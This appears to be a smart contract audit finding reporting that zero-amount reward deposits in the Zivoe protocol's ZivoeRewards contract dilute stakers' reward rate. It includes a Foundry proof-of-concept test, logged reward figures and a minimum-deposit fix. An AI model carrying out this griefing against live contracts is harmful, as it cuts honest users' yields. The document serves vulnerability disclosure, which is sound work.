# Attacker Can Reduce Reward Yield Using 0 Deposits

## Summary

An attacker can deposit 0 reward amount via the function `depositReward()` and dilute the rewards for other users .

## Vulnerability Detail

The function `depositRewards()` is used to transfer in rewards to the `ZivoeRewards` contract which would be distributed to the users/stakers.

https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-foundry/src/ZivoeRewards.sol#L228-L241

You can see there is no minimum deposit criteria , therefore an attacker can just send in 0 amount as rewards , and it would be diluted due to the impact in reward rate .
To demonstrate lets look at the coded PoC:

Paste this test in the Test_ZivoeRewards.sol file , and make a change in that file , at L26 edit the amount to be 10000 ether i.e. `assert(god.try_push(address(DAO), address(ZVEClaimer), address(ZVE), 10000 ether, ""));` and run with -vvvvv

```solidity
function test_Deposit_Zero() public {

        uint256 deposit = 100 ether + 100 ether; // Minimum 100 DAI deposit.
        ZVEClaimer.forward(address(ZVE), 5000 ether, address(sue));

        
        assert(sue.try_approveToken(address(ZVE), address(stZVE), IERC20(address(ZVE)).balanceOf(address(sue))));
        sue.try_stake(address(stZVE), 5 ether);
        depositReward_DAI(address(stZVE), deposit);

        

        hevm.warp(block.timestamp + 1 days);

        depositReward_DAI(address(stZVE), 0 ether);

        hevm.warp(block.timestamp + 1 days);


        sue.try_getRewards(address(stZVE));
        

    }
```

You will see in the logs that reward is `13111111111110969600`

Now comment out the line `depositReward_DAI(address(stZVE), 0 ether);` from the test and then run , we will get ->

`13333333333333248000`

You see reward amount is more i.e more when there were no 0 deposits , the impact can be more with higher values in the pool.


## Impact

The attacker succesfully diluted the rewards for the user making a 0 deposit and affecting the reward rate.

## Tool used

Manual Review , Foundry

## Recommendation

Introduce a min deposit amount such that after a deposit the reward rate is strictly equal or more than the previous.
